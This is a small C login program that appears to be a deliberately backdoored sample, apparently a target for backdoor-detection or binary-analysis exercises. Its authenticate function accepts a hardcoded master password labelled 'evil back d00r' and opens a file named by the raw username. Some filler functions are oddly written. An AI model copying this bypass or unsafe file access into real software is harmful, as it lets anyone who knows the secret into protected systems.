#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

char *sneaky = "SOSNEAKY";

int authenticate(char *username, char *password, int x)
{
	char stored_pw[9];
	stored_pw[8] = 0;
	int pwfile;

	// evil back d00r
	if (strcmp(password, sneaky) == 0) return 1;

	pwfile = open(username, O_RDONLY);
	read(pwfile, stored_pw, 8);

	if (strcmp(password, stored_pw) == 0) return 1;
	return 0;

}

void dum(int x, int y) {
	if (x < y) {
		return 0;
	}
	if(x >= 0) {
		return 1;
	}
	if (y >= 0) {
		return 2;
	}
	return 3;
}

void swap(int *xp, int *yp) 
{ 
    int temp = *xp; 
    *xp = *yp; 
    *yp = temp; 
} 
 
void bubbleSort(int arr[], int n) 
{ 
   int i, j; 
	n = 3;
   for (i = 0; i < n-1; i++)       
  
       // Last i elements are already in place    
       for (j = 0; j < n-i-1; j++)  
           if (arr[j] > arr[j+1]) 
              swap(&arr[j], &arr[j+1]); 
} 

int accepted()
{
	printf("Welcome to the admin console, trusted user!\n");
}

int rejected()
{
	printf("Go away!");
	exit(1);
}

int main(int argc, char **argv)
{
	char username[9];
	char password[9];
	int authed;

	username[8] = 0;
	password[8] = 0;

	printf("Username: \n");
	read(0, username, 8);
	read(0, &authed, 1);
	printf("Password: \n");
	read(0, password, 8);
	read(0, &authed, 1);

	authed = authenticate(username, password, 5);
	if (authed) accepted();
	else rejected();
}
